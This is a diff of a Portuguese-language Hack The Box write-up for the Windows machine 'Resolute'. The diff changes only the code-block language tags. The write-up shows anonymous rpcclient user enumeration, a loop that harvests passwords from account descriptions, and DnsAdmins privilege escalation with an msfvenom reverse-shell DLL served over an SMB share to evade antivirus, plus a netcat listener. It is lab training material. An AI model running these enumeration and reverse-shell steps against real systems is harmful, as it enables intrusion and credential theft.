@@ -187,7 +187,7 @@
 <p>A primeira fase de todo e qualquer PenTesting é a fase de enumeração. Para isso, irei utilizar a clássica ferramenta NMAP.</p>
 <p><img src="Assets/HTB-Windows-Medium-Resolute/Enum-nmap-allPorts.png" alt="Enumeração de todas as portas" /></p>
 <p>Montes de portas para esta máquina! Ainda nunca me lembrei de falar de uma função que tenho definida a nível de zshrc. Para quem segue o S4vitar, sabe certamente da sua utilidade <strong><em>&quot;exctractports&quot;</em></strong> (Atenção à prenuncia: igzxtráááááctPóórt). E para quem não conhece, recomendo vivamente!! (https://www.youtube.com/channel/UCNHWpNqiM8yOQcHXtsluD7Q). Alterei um pouco a função dele para se adequar ao meu ambiente WSL2 e para copiar para clipboard não só as portas, mas também o &quot;nmap <IP> -p<Portas>&quot; e a seguir é que ponho manualmente os parâmetros que quero.</p>
-<pre><code class="language-bash">extractPorts () {
+<pre><code class="language-powershell">extractPorts () {
 	reset=&quot;\e[0m&quot;
 	amarelo=&quot;\e[1;33m&quot;
 	verde=&quot;\e[1;32m&quot;
@@ -276,10 +276,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Com outras ferramentas como smbclient ou smbmap também não se pode enumerar nada de interessante...</p>
 <h2 id="servidor-rpc"><a class="header" href="#servidor-rpc">Servidor RPC</a></h2>
 <p>Com <strong>&quot;rpcclient&quot;</strong> a coisa é diferente. Já se pode entrar em modo anónimo com usuário &quot;&quot; (vazio)</p>
-<pre><code class="language-bash">rpcclient -U '' 10.10.10.169 -N
+<pre><code class="language-powershell">rpcclient -U '' 10.10.10.169 -N
 </code></pre>
 <p>Desta forma entramos em modo interativo e é possível introduzir comandos, tendo neste caso respostas. Mas esta ferramenta também pode ser usada com o parametro &quot;-c&quot; que nos permite enviar o commando, e obter resposta em output normal.</p>
-<pre><code class="language-bash">rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers'
+<pre><code class="language-powershell">rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers'
 #&gt;  user:[Administrator] rid:[0x1f4]
 #&gt;  user:[Guest] rid:[0x1f5]
 #&gt;  user:[krbtgt] rid:[0x1f6]
@@ -310,15 +310,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 <p>Desta forma, podemos filtar o output, exportar para ficheiro e tal, como qualquer outro commando do sistema.</p>
 <p>A primeira a coisa a fazer é gravar para um ficheiro todos os usernames</p>
-<pre><code class="language-bash">rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d &quot;[]&quot; &gt; contents/users
+<pre><code class="language-powershell">rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d &quot;[]&quot; &gt; contents/users
 </code></pre>
 <p>Depois disso, podemos extrair mais informações. O RPC funciona com queries ao rid e não ao username.</p>
-<pre><code class="language-bash">rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $2}' | grep -oP '\[.*?\]' | tr -d &quot;[]&quot; | xargs
+<pre><code class="language-powershell">rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $2}' | grep -oP '\[.*?\]' | tr -d &quot;[]&quot; | xargs
 #&gt; 0x1f4 0x1f5 0x1f6 0x1f7 0x451 0x457 0x19c9 0x19ca 0x19cb 0x19cc 0x19cd 0x19ce 0x19cf 0x19d0 0x19d1 0x19d2 0x19d3 0x19d4 0x19d5 0x19d6 0x19d7 0x19d8 0x19d9 0x2775 0x2776 0x2777 0x2778
 </code></pre>
 <p>Com todos os rids, podemos pedir detalhes de cada um e filtrar apenas os campos que nos interessa usando vários rpcclient com apenas uma linha de commando...</p>
 <p>O que nos interessa por enquanto é obter informações básica. Queremos saber os nomes de usuários, e se o mesmo foi criado com alguma descrição que possamos usar no futuro. Em empresas, é comum mencionar dados sensíveis no campo de descrição quando o administrador cria um novo usuário (password por defeito, função, email, contacto telefónico...). É claro que, para um CaptureTheFlag, o número de telefone não me é muito util (provavelmente ser um fictício lol), mas uma palavra passe dá sempre jeito =).</p>
-<pre><code class="language-bash">for rid in $(rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $2}' | grep -oP '\[.*?\]' | tr -d &quot;[]&quot;); do echo; rpcclient -U '' 10.10.10.169 -N -c &quot;queryuser $rid&quot; | grep -E &quot;User Name|Description&quot;; done
+<pre><code class="language-powershell">for rid in $(rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $2}' | grep -oP '\[.*?\]' | tr -d &quot;[]&quot;); do echo; rpcclient -U '' 10.10.10.169 -N -c &quot;queryuser $rid&quot; | grep -E &quot;User Name|Description&quot;; done
 
 #&gt;          User Name   :   Administrator
 #&gt;          Description :   Built-in account for administering the computer/domain
@@ -412,16 +412,16 @@ type &quot;C:/PSTranscripts/20191203/PowerShell_transcript.RESOLUTE.OJuoBGhU.201
 <h1 id="grupo-megabankdnsadmins"><a class="header" href="#grupo-megabankdnsadmins">Grupo MEGABANK\DnsAdmins</a></h1>
 <p>Este group permite aos seus membros configurar, iniciar, e parar o serviço dns do windows. O serviço DNS pode carregar configurações a partir de ficheiros.dll. E este serviço é iniciado com privilégios máximos de Authority System! Posto isso, é fácil elaborar um exploit para nos converter-mos em administrador da máquina. O commando que queremo que o alvo execute é um reverse shell</p>
 <h2 id="criação-do-ficheirodll-malicioso"><a class="header" href="#criação-do-ficheirodll-malicioso">Criação do ficheiro.dll malicioso</a></h2>
-<pre><code class="language-bash">[Environment]::Is64BitOperatingSystem
+<pre><code class="language-powershell">[Environment]::Is64BitOperatingSystem
 #&gt;  True
 </code></pre>
 <p>A máquina é de 64 bits, portanto o reverse shell terá de 64 bits</p>
-<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f dll -o rev.dll
+<pre><code class="language-powershell">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f dll -o rev.dll
 </code></pre>
 <p>Iremos agora transferir o ficheiro para a máquina alvo com, por exemplo, certutil:</p>
 <p><img src="Assets/HTB-Windows-Medium-Resolute/dnsadmin-blocked_by_antivirus.png" alt="Antivirus bloqueia o rev.dll" /></p>
 <p>OH SHIT! O antivírus está ativo... Temos 2 soluções, ou ofuscar o código (que pode levar alguma tentativas porque não fica um ficheiro limpo) ou partilhar um servidor Samba, porque o dll malicioso pode ser chamado a partir de fora da máquina alvo!</p>
-<pre><code class="language-bash">sudo smbserver.py smbFolder $(pwd) -smb2support  # o reverse shell tem de se encontrar na pasta onde se executa o commando
+<pre><code class="language-powershell">sudo smbserver.py smbFolder $(pwd) -smb2support  # o reverse shell tem de se encontrar na pasta onde se executa o commando
 
 sudo rlwrap nc -lvnp 443
 </code></pre>
